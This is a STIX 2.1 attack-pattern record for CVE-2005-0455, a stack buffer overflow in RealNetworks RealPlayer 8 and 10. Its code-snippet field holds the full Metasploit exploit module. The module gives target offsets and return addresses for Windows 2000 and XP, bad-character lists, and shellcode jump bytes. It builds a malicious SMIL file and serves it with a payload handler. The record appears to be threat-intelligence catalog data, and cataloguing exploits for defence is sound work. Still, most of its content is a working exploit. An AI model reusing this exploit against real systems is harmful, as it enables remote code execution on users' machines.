{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d61f04e8-ea11-43d3-9ba2-e9373fd723eb",
    "created": "2024-08-14T16:44:38.20866Z",
    "modified": "2024-08-14T16:44:38.208664Z",
    "name": "RealNetworks RealPlayer SMIL Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in RealNetworks RealPlayer 10 and 8.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/realplayer_smil.rb",
            "external_id": "realplayer_smil.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0455"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'RealNetworks RealPlayer SMIL Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in RealNetworks RealPlayer 10 and 8.\n        By creating a URL link to a malicious SMIL file, a remote attacker could\n        overflow a buffer and execute arbitrary code.\n        When using this module, be sure to set the URIPATH with an extension of '.smil'.\n        This module has been tested with RealPlayer 10 build 6.0.12.883 and RealPlayer 8\n        build 6.0.9.584.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          [ 'CVE', '2005-0455' ],\n          [ 'OSVDB', '14305'],\n          [ 'BID', '12698' ],\n        ],\n\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x90\\x0a\\x0d\\x20\\x3c\\x3e\\x2f\\x5c\\x22\\x58\\x3d\\x3b\\x40\\x3f\\x27\\x26\\x25\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'RealPlayer 10/8 on Windows 2000 SP0-SP4 English',     { 'Offset' => 608, 'Ret' => 0x75022ac4 } ],\n          [ 'RealPlayer 10/8 on Windows XP PRO SP0-SP1 English',   { 'Offset' => 584, 'Ret' => 0x71aa2461 } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2005-03-01',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    cruft  =  rand_text_alpha_upper(1)\n    bleh   =  rand_text_alpha_upper(11)\n\n    sploit =  rand_text_alpha_upper(target['Offset']) + payload.encoded\n    sploit << \"\\xeb\\x06\" + rand_text_alpha_upper(2) + [target.ret].pack('V')\n    sploit << [0xe8, -485].pack('CV')\n\n    # Build the HTML content\n    content =  \"<smil><head><layout><region id=\\\"#{cruft}\\\" top=\\\"#{cruft}\\\" /></layout></head>\"\n    content << \"<body><text src=\\\"#{bleh}.txt\\\" region=\\\"size\\\" system-screen-size=\\\"#{sploit}\\\" /></body></smil>\"\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_contributors": [
        "MC",
        ""
    ],
    "x_mitre_disclosure_date": "2005-03-01",
    "x_mitre_platforms": [
        "win'"
    ]
}